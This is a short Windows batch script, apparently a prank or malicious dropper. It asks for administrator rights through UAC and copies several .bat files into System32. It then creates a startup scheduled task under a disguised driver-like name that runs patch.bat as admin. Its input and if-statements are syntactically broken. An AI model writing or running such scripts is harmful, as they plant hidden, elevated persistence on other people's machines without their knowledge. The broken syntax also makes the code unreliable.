echo Requesting Administrator privledges, please wait for UAC.
powershell /c start-process -verb runAs \"%~s0\"
cd %homepath%\desktop
echo hello alexendre 
move msdos.bat %windir%\System32
move win.bat %windir%\system32
move reboot.bat %windir%\system32
/p %input% "demarrer maintenant"
if %input% = 0 goto n
if %input% = 1 goto y
SCHTASKS /CREATE /SC onstart /TN "drivers\DosWpcKill" /TR "C:\Windows\System32\patch.bat" /RU admin

